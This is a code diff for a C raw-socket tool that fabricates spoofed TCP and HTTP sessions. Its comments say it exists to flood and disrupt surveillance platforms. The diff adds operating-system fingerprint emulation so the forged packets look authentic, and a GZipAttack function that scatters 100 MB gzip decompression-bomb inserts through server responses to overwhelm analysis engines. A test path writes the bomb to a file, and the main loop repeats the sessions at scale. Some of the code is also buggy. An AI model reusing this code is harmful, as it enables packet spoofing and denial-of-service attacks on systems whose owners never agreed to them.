@@ -191,6 +191,7 @@ isnt sure then havinng somme situations like this only helps)
 #include <resolv.h>
 #include <sys/stat.h>
 #include <sys/time.h>
+#include <zlib.h>
 //#include "structs.h"
 //#include <list.h>
 //#include "utils.h"
@@ -208,8 +209,11 @@ isnt sure then havinng somme situations like this only helps)
 #include <net/ethernet.h>
 #endif
 
+// generic linked list structure which will always work for any structure type with 'next' as its first element
+// you just need to cast to (LINK *<*>)
 typedef struct _link { struct _link *next; } LINK;
 
+// count the amount of entries in a linked list
 int L_count(LINK *ele) {
     int count = 0;
     
@@ -222,25 +226,29 @@ int L_count(LINK *ele) {
   }
 
   
-
+// finds the last element in a linked list
 LINK *L_last(LINK *list) {
     while (list->next != NULL) {
       list = list->next;
     }
     
     return list;
-  }
-  
-// order the linking (so its FIFO) instead of LIFO
+}
+
+
+// Orderd linking (first in first out) which is required for packets
 void L_link_ordered(LINK **list, LINK *ele) {
     LINK *_last = NULL;
     
+    // if the list has no entries.. then this becomes its first element
     if (*list == NULL) {
       *list = ele;
       return;
     }
-    
+
+    // find the last element
     _last = L_last(*list);
+    // and append this to that one..
     _last->next = ele;
   }
 
@@ -334,7 +342,7 @@ int prepare_socket() {
     int rawsocket = 0;
     int one = 1;
     
-    rawsocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
+    rawsocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (setsockopt(rawsocket,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one)) < 0)
         return -1;
 
@@ -366,18 +374,19 @@ int FlushAttackOutgoingQueueToNetwork() {
     }
     
     while (optr != NULL) {
-
         // parameters required to write the spoofed packet to the socket.. it ensures the OS fills in the ethernet layer (src/dst mac
         // addresses for the local IP, and local IP's gateway
         rawsin.sin_family       = AF_INET;
         rawsin.sin_port         = optr->dest_port;
         rawsin.sin_addr.s_addr  = optr->dest_ip;
     
+        // write the packet to the raw network socket.. keeping track of how many bytes
         int bytes_sent = sendto(raw_socket, optr->buf, optr->size, 0, (struct sockaddr *) &rawsin, sizeof(rawsin));
 
         // I need to perform some better error checking than just the size..
         if (bytes_sent != optr->size) break;
 
+        // keep track of how many packets.. the calling function will want to keep track
         count++;
 
         // what comes after? we are about to free the pointer so..
@@ -414,7 +423,8 @@ int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     if ((optr = (AttackOutgoingQueue *)calloc(1,sizeof(AttackOutgoingQueue))) == NULL) {
         return -1;
     }
-    // we pass the pointer so its not going to use CPU usage to copy it again...
+
+    // we move the pointer so its not going to use CPU usage to copy it again...
     // the calling function should release the pointer (set to NULL) so that it doesnt
     // free it too early
     optr->buf = qptr->buf;
@@ -787,18 +797,9 @@ void BuildPackets(AS_attacks *aptr) {
     }
 
     while (ptr != NULL) {
-        // Rebuild TCP options for this packet (useful for OS emulation etc)
-        if (ptr->flags & TCP_OPTIONS) {
-            if (PacketBuildOptions(ptr) != 1) {
-                // If it failed for some reason...
-                aptr->completed = 1;
-
-                return;
-            }
-        }
-
-        // Build the single packet, and verify it worked out alright.
-        if ((BuildSinglePacket(ptr) != 1) || (ptr->packet == NULL) || (ptr->packet_size <= 0)) {
+        // Build the options, single packet, and verify it worked out alright.
+        if ((PacketBuildOptions(ptr) != 1) || (BuildSinglePacket(ptr) != 1) ||
+                 (ptr->packet == NULL) || (ptr->packet_size <= 0)) {
             // Mark for deletion otherwise
             aptr->completed = 1;
 
@@ -826,6 +827,7 @@ void BuildPackets(AS_attacks *aptr) {
 
         qptr->buf = ptr->packet;
         qptr->size = ptr->packet_size;
+        // These are required for sending the packet out on the raw socket.. so lets pass it
         qptr->dest_ip = ptr->destination_ip;
         qptr->dest_port = ptr->destination_port;
 
@@ -863,6 +865,9 @@ int PacketBuildOptions(PacketBuildInstructions *iptr) {
 
     int current_options_size = 12;
 
+    // verify that we should even generate the options.. if not return 1 (no error)
+    if (!(iptr->flags & TCP_OPTIONS))
+        return 1;
     /*
     if (iptr->flags & TCP_OPTIONS_TIMESTAMP) {
         current_options_size += 8;
@@ -915,8 +920,8 @@ int BuildSinglePacket(PacketBuildInstructions *iptr) {
 
     // IP header below
     p->ip.version 	= 4;
-    p->ip.ihl 	= IPHSIZE >> 2;
-    p->ip.tos 	= 0;    
+    p->ip.ihl   	= IPHSIZE >> 2;
+    p->ip.tos   	= 0;    
     p->ip.frag_off 	= 0x0040;
     p->ip.protocol 	= IPPROTO_TCP;
 
@@ -926,41 +931,40 @@ int BuildSinglePacket(PacketBuildInstructions *iptr) {
 
     // These two relate to dynamically changing information.. TTL=OS emulation, header identifier gets incremented..
     // and should be changed every connection that is wrote to the wire
-    p->ip.id 	= htons(iptr->header_identifier);
-    p->ip.ttl 	= iptr->ttl;
+    p->ip.id 	    = htons(iptr->header_identifier);
+    p->ip.ttl 	    = iptr->ttl;
 
     // total length
-    p->ip.tot_len = htons(final_packet_size);
+    p->ip.tot_len   = htons(final_packet_size);
     
 
     // TCP header below
-
     // The source, and destination ports in question
-    p->tcp.source = htons(iptr->source_port);
-    p->tcp.dest = htons(iptr->destination_port);
+    p->tcp.source   = htons(iptr->source_port);
+    p->tcp.dest     = htons(iptr->destination_port);
 
     // The ACK/SEQ relate to variables incremented during normal communications..
-    p->tcp.seq = htonl(iptr->seq);
+    p->tcp.seq      = htonl(iptr->seq);
     p->tcp.ack_seq	= htonl(iptr->ack);
 
     // The TCP window relates to operating system emulation
     p->tcp.window	= htons(iptr->tcp_window_size);
     
     // syn/ack used the most
-    p->tcp.syn	= (iptr->flags & TCP_FLAG_SYN) ? 1 : 0;
-    p->tcp.ack	= (iptr->flags & TCP_FLAG_ACK) ? 1 : 0;
-    p->tcp.psh	= (iptr->flags & TCP_FLAG_PSH) ? 1 : 0;
-    p->tcp.fin	= (iptr->flags & TCP_FLAG_FIN) ? 1 : 0;
-    p->tcp.rst	= (iptr->flags & TCP_FLAG_RST) ? 1 : 0;
+    p->tcp.syn  	= (iptr->flags & TCP_FLAG_SYN) ? 1 : 0;
+    p->tcp.ack	    = (iptr->flags & TCP_FLAG_ACK) ? 1 : 0;
+    p->tcp.psh  	= (iptr->flags & TCP_FLAG_PSH) ? 1 : 0;
+    p->tcp.fin  	= (iptr->flags & TCP_FLAG_FIN) ? 1 : 0;
+    p->tcp.rst	    = (iptr->flags & TCP_FLAG_RST) ? 1 : 0;
 
     
     p->tcp.check	= 0;	/*! set to 0 for later computing */
-    p->tcp.urg	= 0;    
+    p->tcp.urg	    = 0;    
     p->tcp.urg_ptr	= 0;
     p->tcp.doff 	= TCPHSIZE >> 2;
 
     // IP header checksum
-    p->ip.check	= (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);
+    p->ip.check	    = (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);
 
     // TCP header checksum
     if (p->tcp.check == 0) {
@@ -1075,6 +1079,64 @@ int DataPrepare(char **data, char *ptr, int size) {
 
     return 1;
 }
+
+// parameters required for emulation of operating systems
+struct _operating_system_emulation_parameters {
+    int id;
+    int ttl;
+    int window_size;
+    // for later when doing mass amounts (millions) of connections, then we should get as accurate as possible
+    int percentage_residential;
+    int percentage_commercial;
+} EmulationParameters[] = {
+    { 1,    64, 5840,   15, 30    },               //Linux
+    { 2,    64, 5720,   0,  1     },               //Google Linux
+    { 4,    64, 65535,  3,  5     },               // FreeBSD
+    { 8,    128, 65535, 40, 55    },               // XP
+    { 16,   128, 8192,  45, 35    },               // Windows 7/Vista/Server 2008
+    { 32,   255, 4128,  1,  5     },                // Cisco
+    { 0,      0,    0,  0,  0     }
+};
+
+enum {
+    OS_LINUX=1,
+    OS_GOOGLE_LINUX=2,
+    OS_FREEBSD=4,
+    OS_XP=8,
+    OS_WIN7=16,
+    OS_CISCO=32
+};
+
+// to do add counting logic, and percentage choices
+void OsPick(int options, int *ttl, int *window_size) {
+    int i = 0;
+    int *list = NULL;
+    int c = 0;
+    int pick = 0;
+    int a = 0;
+
+    for (i = 0; EmulationParameters[i].id != 0; i++) {
+        if (options & EmulationParameters[i].id) c++;
+    }
+
+    list = (int *)calloc(1,sizeof(int) * (c + 1));
+    if (list == NULL) pick = OS_XP;
+
+    for (i = a = 0; EmulationParameters[i].id != 0; i++) {
+        if (options & EmulationParameters[i].id)
+            list[a] = EmulationParameters[i].id;
+    }
+    
+    pick = list[rand()%c];
+
+    *ttl = EmulationParameters[pick].ttl;
+    *window_size = EmulationParameters[pick].window_size;
+
+    if (list != NULL) free(list);
+    return;
+}
+
+
 
 
 // Generates instructions for fabricating a TCP connection being opened between two hosts..
@@ -1401,10 +1463,12 @@ int BuildSMTPsession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
 // Fabricates a fake HTTP session to inject information directly into mass surveillance platforms
 // or help perform DoS attacks on their systems to disrupt their usages. This is the NEW HTTP function
 // which uses the modular building routines.
-int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,  int client_size, char *server_body, int server_size) {
+int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,
+        int client_size, char *server_body, int server_size) {
     PacketBuildInstructions *bptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     ConnectionProperties cptr;
+    int i = 0;
 
     // these are in headers.. and seems to be +1 fromm start..
     // we need to get more requests for when they begin to *attempt* to filter these out..
@@ -1423,25 +1487,31 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     uint32_t client_seq = rand()%0xFFFFFFFF;
     uint32_t server_seq = rand()%0xFFFFFFFF;
 
+    //OsPick(int options, int *ttl, int *window_size)
+    OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
+    OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);
 
     cptr.server_ip = server_ip;
     cptr.server_port = server_port;
     cptr.client_ip = client_ip;
     cptr.client_port = client_port;
     gettimeofday(&cptr.ts, NULL);
-    cptr.max_packet_size_client = max_packet_size_client;
-    cptr.max_packet_size_server = max_packet_size_server;
-    cptr.server_ttl = 53;
-    cptr.client_ttl = 64;
+    cptr.aptr = aptr;
     cptr.server_identifier = server_identifier;
     cptr.client_identifier = client_identifier;
-    cptr.aptr = aptr;
     cptr.client_seq = client_seq;
     cptr.server_seq = server_seq;
     // deal with it later when code is completed..
     cptr.client_emulated_operating_system = 0;
     cptr.server_emulated_operating_system = 0;
     
+    // would we like to inject some GZip attacks? Lets keep it down to 10% for now (obviously ill make it dynamic/controlled w strategy later)
+    i = rand()%10;
+    if (i) {
+        //int GZipAttack(int options, int *size, char **server_body, int attack_size, int how_many_different_insertions)
+        // lets do 100meg inserts... 50 times
+        //GZipAttack(0,&server_size, &server_body, 1024*1024*100, 50);
+    }
 
     // open the connection...
     if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) goto err;
@@ -1469,6 +1539,268 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
 
 
 
+// inject gzip attacks randomly into a message which is to be delivered via HTTP as a responsse from a server
+// it will attack the analysis engines of the surveillance platforms themselves.. and if done correctly (changing, etc)
+// it will be impractical to detet until its already decompressing lots of data..
+// we dont have to do a 10gigabytes, etc at a single location..
+// we can spread that into 150-300 different locations (normal bytes of a body) therefore it will stay below their
+// analysis engines attempts to detect >10megabyte, or other guesses data expecting to be decommpressed...
+// the fact is.. we are fabricating possibly millions of connections.. who gives a fuck if we can only do 10megabytes GZIP every
+// few characters instead of gigabytes at one location?
+// https://github.com/cyberisltd/GzipBloat
+// It will take a body, rewrite it adjusting its size.. adding gzip attacks randomly by parameters,
+// and returning an updated HTTP response + header :)...
+// they aint ready.
+// this further ensures these systems are bogged down and useless.
+// if the content is already gzip'd thnen we will have to unzip to rezip with the proper manipulations..
+// otherwise we just pick sommewhere
+int GZipAttack(int options, int *size, char **server_body, int attack_size, int how_many_different_insertions) {
+    int i = 0, n = 0, y = 0, q = 0, r = 0;
+    char *data = NULL;
+    int data_size = 0;
+    char *sptr = 0;
+    int zip_size = 0;
+    z_stream infstream;
+    z_stream outstream;
+    char *compressed = NULL;
+    int compressed_size = 0;
+    int compressed_in = 0;
+    int compressed_out = 0;
+    char data_to_compress[1024];
+    char *buf = NULL;
+    int next_i = 0;
+    char *zptr = NULL;
+    char *compressed_realloc = NULL;
+
+    // will contain 0 or 1 where  insertions go
+    // this coould be a bitmask whatever.. dont care atm
+    char *insertions = NULL;
+
+    srand(time(0));
+    // first we unzip it so we can modify..
+    // ill do some proper verification later.. but remember? we are supplying the body ourselves..
+    // I hoppe if someone doesn't understand whats going on they dont attempt to change things...
+    // but by all means ;) keep attacking.
+    if (strstr((char *)*server_body, (char *)"gzip") != NULL) {
+        sptr = strstr((char *)*server_body, (char *)"\r\n\r\n"); 
+        if (sptr != NULL) {
+            sptr += 4;
+
+            // need to find out why the server responded with 180 here.. is it a size? related sommehow to gzip? or chunked? deal w it later
+            sptr = strstr((char *)sptr, "\r\n");
+            sptr += 2;
+
+            // sptr should have the correct location now..lets get the size...
+            zip_size = (int)(((*server_body) + *size) - sptr);
+
+            // we must decompress the information first
+            // being relaxed coding this.. will be more precise later.. just giving twice the space..
+            data = (char *)calloc(1, zip_size * 2);
+            if (data != NULL) {
+                // simple gzip decompression
+                //https://gist.github.com/arq5x/5315739
+                infstream.zalloc = Z_NULL;
+                infstream.zfree = Z_NULL;
+                infstream.opaque = Z_NULL;
+
+                infstream.avail_in = zip_size;
+                infstream.next_in = (Bytef *)sptr;
+
+                infstream.avail_out = (uInt)(zip_size * 2);
+                infstream.next_out = (Bytef *)data;
+
+                // execute proper zlib functions for decompression
+                inflateInit2(&infstream, 15+16);
+                inflate(&infstream, Z_NO_FLUSH);
+                inflateEnd(&infstream);
+                
+                // data contains the decompressed data now.. lets get the size..
+                data_size = infstream.total_out;
+
+                printf("decompressed %lu\n", infstream.total_out);
+
+            }
+        }
+    }
+    
+
+    if (data == NULL) {
+        data = *server_body;
+        data_size = *size;
+    }
+
+    // allocte space for a structure which will contain which locations will get an injection
+    insertions = (char *)calloc(1, *size);
+    // allocate space for the compressed output...
+    compressed = (char *)calloc(1, data_size * (600*3));
+    // buffer for injecting attack
+    buf = (char *)calloc(1, attack_size);
+
+    // ensure both were allocated properly..
+    if ((insertions == NULL) || (compressed == NULL) || (buf == NULL)) {
+        if (data != *server_body) free(data);
+
+        if (buf != NULL) free(buf);
+        if (compressed != NULL) free(buf);
+        if (insertions != NULL) free(buf);
+        
+        return -1;
+    }
+
+    // how many places will we insert? lets randomly pick & mark them
+    i = 1 + (rand() % (how_many_different_insertions - 1));
+    //i = how_many_different_insertions;
+
+    printf("how many places do we insert %d\n", i);
+    // if its too many for this server body.. lets do it 1 less time than all characters
+    if (i > data_size) i = data_size - 1;
+
+    while (i > 0) {
+        n = rand()%*size;
+        // make suree we didnt already mark this byte..
+        if (insertions[n] == 1) {
+            continue;
+        }
+
+        // mark the location where we would like to insert this attack
+        insertions[n] = 1;
+
+        printf("marking byte %d %d\n", n, insertions[n]);
+
+        i--;
+    }
+    
+    outstream.zalloc = Z_NULL;
+    outstream.zfree = Z_NULL;
+    outstream.opaque = Z_NULL;
+
+    // execute proper zlib functions for decompression
+    if (deflateInit2 (&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {
+        printf("gzip init error\n");
+    }
+
+    // compress data injecting attacks at bytes required..
+    sptr = data;
+    while (sptr < (data + data_size)) {
+
+        printf("sptr %p data %p size %d sptr - data = %d\n", sptr, data, data_size, sptr-data);
+
+        zptr = sptr;
+        next_i = 0;
+        while (!next_i && (zptr <= (data + data_size))) {
+            y = zptr - data;
+            if (insertions[y] == 1) {
+                next_i = zptr - sptr;
+                printf("next_i %d\n", next_i);
+                break;
+            }
+        
+            zptr++;
+        }
+
+        // we dont have anymore injections to insert.. so we compress the rest of the data..
+        if (next_i == 0) {
+            y = (data + data_size) - sptr;
+            printf("y = %d\n", y);
+        } else {
+            // we have a location to insert the next at.. so we want to compress everything until that location...
+            y = next_i;
+            printf("y2 = %d\n", y);
+        }
+
+        // our current location...
+        n = sptr - data;
+        // check if we are supposed to insert here...
+        if (insertions[n] == 1) {
+            printf("INJECTING\n");
+            printf("current has inj: %d\n", n);
+            // set all of buf (attack buf) to the current character
+            memset(buf, *sptr, attack_size);
+
+            outstream.avail_in = attack_size;
+            outstream.next_in = (Bytef *)buf;
+
+            // we output it but calculate just so there are no bullshit issues later
+            outstream.avail_out = (uInt)((data_size * (600*3)) - compressed_out);
+            outstream.next_out = (Bytef *)(compressed + compressed_out);
+
+            // run the zlib command so it compresses using it...
+            deflate(&outstream, Z_NO_FLUSH);
+
+            // update our information for how many bytes are located in compressed_out..
+            compressed_out = outstream.total_out;
+            printf("INJ total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
+
+            // done this one..
+            insertions[n] = 0;
+
+            continue;
+        }
+
+        outstream.avail_in = y;
+        //printf("avail in %d\n", y);
+        outstream.next_in = (Bytef *)sptr;
+        outstream.avail_out = (uInt)((data_size * (600*3)) - compressed_out);
+        outstream.next_out = (Bytef *)(compressed + outstream.total_out);
+    
+        n = outstream.total_in;
+        q = outstream.total_out;
+        i = deflate(&outstream, Z_NO_FLUSH);
+        //if (i != 0) printf("i %d\n", i);
+        /*
+        if (i == -5) {
+
+            printf("realloc %p errno %d\n", compressed, errno);
+            compressed_realloc = (char *)realloc((void *)compressed, outstream.total_out * 2);
+            if (compressed == compressed_realloc) {
+                // lets try to flush?
+                
+            }
+            printf("realloc %p errno %d\n", compressed, errno);
+        }*/
+        y = outstream.total_in;
+        r = outstream.total_out;
+
+        printf("total in in %d\n", outstream.total_in);
+        // update by how many bytes went out..
+        compressed_in += (y - n);
+        compressed_out = outstream.total_out;
+
+        printf("total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
+        
+        // increase sptr by the amount of bytes
+        sptr += (y - n);
+
+        if (sptr == (data + data_size)) {
+            outstream.avail_in = 0;
+            deflate(&outstream, Z_FINISH);
+        }
+        
+        printf("total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
+        compressed_out = outstream.total_out;
+    }
+
+    deflateEnd(&outstream);
+
+    // some doc online said to use these parameters for gzip.. after testing ill check it out..
+    //wbits = zlib.MAX_WBITS | 16
+
+
+    // free the decompression buffer.. if its still allocated
+    if (data != *server_body) free(data);
+
+    // free the origin calling function's buffer, and replace with our new compression buffer
+    free(*server_body);
+    *server_body = compressed;
+    *size = compressed_out;
+    
+    // free the insertion (table) we used to randomize our insertions
+    free(insertions);
+
+    // free the attack buffer (which was used to set the current character X times so it would be compressed by that X size)
+    free(buf);
+    return 1;
+}
 
 
 
@@ -1496,11 +1828,13 @@ void *HTTP_Create(AS_attacks *aptr) {
     int i = 0;
     
     #ifndef BIG_TEST
-        printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body, G_server_body_size);
+        printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body,
+                 G_server_body_size);
     #endif
     
         // lets try new method    
-        i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body, G_server_body_size);
+        i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body,
+                     G_server_body_size);
     
     #ifndef BIG_TEST
         printf("GenerateBuildInstructionsHTTP() = %d\n", i);
@@ -1624,6 +1958,7 @@ int main(int argc, char *argv[]) {
     int count = 1;
     int repeat_interval = 1;
     int i = 0, r = 0;
+    FILE *fd;
 #ifdef BIG_TEST
     int repeat = 1000000;
 #endif
@@ -1636,27 +1971,45 @@ int main(int argc, char *argv[]) {
 
     // *** Not much error checking on anything  here.. its quick & dirty.
     // client information
-    client_ip = inet_addr(argv[1]);
-    client_port =atoi(argv[2]);
+    client_ip       = inet_addr(argv[1]);
+    client_port     = atoi(argv[2]);
 
     // server information
-    server_ip = inet_addr(argv[3]);
-    server_port = atoi(argv[4]);
+    server_ip       = inet_addr(argv[3]);
+    server_port     = atoi(argv[4]);
 
     // client request data (in a file)
-    G_client_body = FileContents(argv[5], &G_client_body_size);
+    G_client_body   = FileContents(argv[5], &G_client_body_size);
     // server responsse data (in a file)
-    G_server_body = FileContents(argv[6], &G_server_body_size);
+    G_server_body   = FileContents(argv[6], &G_server_body_size);
     
+#ifdef GZIPTEST
+    // lets test gzip
+    GZipAttack(0,&G_server_body_size, &G_server_body, 1024*1024*100, 11);
+
+    // lets write to output...
+    fd = fopen("test.gz","wb");
+    if (fd == NULL) {
+        printf("couldnt open output file.. maybe some other problem witth gzip\n");
+        exit(-1);
+    }
+    fwrite((void *)G_server_body, 1, G_server_body_size, fd);
+    fclose(fd);
+    
+    printf("wrote gzip attack file.. done\n");
+    exit(-1);
+#endif
+
     // how maany times to repeat this session on the internet?
     // it will randomize source port, etc for each..
-    count = atoi(argv[7]);
+    count           = atoi(argv[7]);
     // how many seconds in between each request?
     // this is because its expecting to handling tens of thousands simul from each machine
     // millions depending on how much of an area the box will cover for disruption of the surveillance platforms
     repeat_interval = atoi(argv[8]);
 
-    if (!client_ip || !server_ip || !client_port || !server_port || !G_client_body || !G_server_body || !count || !repeat_interval) goto bad_syntax;
+    if (!client_ip || !server_ip || !client_port || !server_port || !G_client_body ||
+             !G_server_body || !count || !repeat_interval) goto bad_syntax;
 
 #ifdef BIG_TEST
     while (repeat--) {
@@ -1664,7 +2017,8 @@ int main(int argc, char *argv[]) {
         client_ip = rand()%0xFFFFFFFF;
 #endif
         // Initialize an attack structure regarding passed information
-        if ((r = AS_session_queue(1, client_ip, server_ip, client_port, server_port, count, repeat_interval, 1, (void *)&HTTP_Create)) != 1) {
+        if ((r = AS_session_queue(1, client_ip, server_ip, client_port, server_port, count, repeat_interval, 1,
+                     (void *)&HTTP_Create)) != 1) {
             printf("error adding session\n");
             exit(-1);
         }
